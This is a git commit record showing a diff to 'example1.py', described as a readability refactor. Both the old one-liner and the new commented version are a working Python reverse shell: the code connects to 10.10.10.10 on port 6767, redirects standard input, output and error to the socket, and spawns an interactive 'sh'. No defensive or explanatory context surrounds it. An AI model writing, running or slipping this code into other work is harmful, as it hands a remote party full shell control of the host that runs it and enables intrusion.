816fbc7eaae92f48a4775adf5846096e138166c1
Janvsec <mailjanvojvoda@gmail.com>
2026-03-09 22:58:31 +0100

    Improve readability and structure of example1.py
    Refactor code for clarity and structure, adding comments.

--- example1.py
+++ example1.py
@@ -1,3 +1,24 @@
-ip="10.10.10.10"
-port="6767"
-import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((ip,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
+#######################################
+# Define the target IP address and port
+ip = "10.10.10.10"
+port = 6767
+#######################################
+# Import necessary modules
+import socket
+import subprocess
+import os
+import pty
+#######################################
+# Create a TCP socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((ip, port))
+#######################################
+# Redirect standard input to the socket
+os.dup2(s.fileno(), 0)
+# Redirect standard output to the socket
+os.dup2(s.fileno(), 1)
+# Redirect standard error to the socket
+os.dup2(s.fileno(), 2)
+# Spawn an interactive shell
+pty.spawn("sh")
+#######################################
